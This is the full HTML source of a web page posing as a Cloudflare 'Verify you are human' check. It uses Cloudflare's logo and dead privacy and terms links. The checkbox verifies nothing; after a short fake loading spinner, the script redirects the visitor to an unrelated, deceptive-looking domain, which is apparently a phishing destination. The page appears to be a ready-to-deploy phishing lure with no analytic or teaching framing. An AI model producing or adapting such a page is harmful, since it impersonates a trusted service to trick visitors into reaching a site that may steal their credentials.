<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 20px;
            width: 300px; /* Reduced width */
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
        }
        .logo {
            width: 100px; /* Adjusted size of the logo */
            margin-bottom: 20px;
        }
        .verification-box {
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid #ccc;
            padding: 10px;
            border-radius: 5px;
            margin: 20px 0;
            background-color: #f9f9f9;
        }
        .verification-box input {
            width: 20px;
            height: 20px;
            margin-right: 10px;
        }
        .cf-branding {
            display: flex;
            align-items: center;
        }
        .cf-branding img {
            width: 20px;
            margin-right: 5px;
        }
        .cf-branding a {
            font-size: 12px;
            color: #666;
            text-decoration: none;
            margin-left: 10px;
        }
        .cf-branding a:hover {
            text-decoration: underline;
        }
        .submit-btn {
            background-color: #0078D4;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .submit-btn:disabled {
            background-color: #b3b3b3;
            cursor: not-allowed;
        }
        .loading {
            display: none;
            margin-top: 20px;
        }
        .spinner {
            width: 30px;
            height: 30px;
            border: 3px solid rgba(0, 0, 0, 0.1);
            border-left-color: #0078D4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/1200px-Cloudflare_Logo.svg.png" alt="Cloudflare Logo" class="logo">
        
        <div class="verification-box">
            <div class="verify">
                <input type="checkbox" id="verify" name="verify">
                <label for="verify">Verify you are human</label>
            </div>
            <div class="cf-branding">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/1200px-Cloudflare_Logo.svg.png" alt="Cloudflare Logo">
                <a href="#">Privacy</a> Â· <a href="#">Terms</a>
            </div>
        </div>

        <form id="verificationForm">
            <button type="button" class="submit-btn" id="submitBtn">Submit</button>
        </form>

        <div class="loading" id="loadingIndicator">
            <div class="spinner"></div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            document.getElementById('submitBtn').addEventListener('click', function () {
                if (document.getElementById('verify').checked) {
                    document.getElementById('loadingIndicator').style.display = 'block';
                    this.setAttribute('disabled', 'true');

                    // Redirect after a delay
                    setTimeout(function () {
                        window.location.href = 'https://quotationstatement.officesviews.info/RTdiSXnW#';
                    }, 3000);
                } else {
                    alert('Please verify that you are a human being by ticking the checkbox.');
                }
            });
        });
    </script>
</body>
</html>
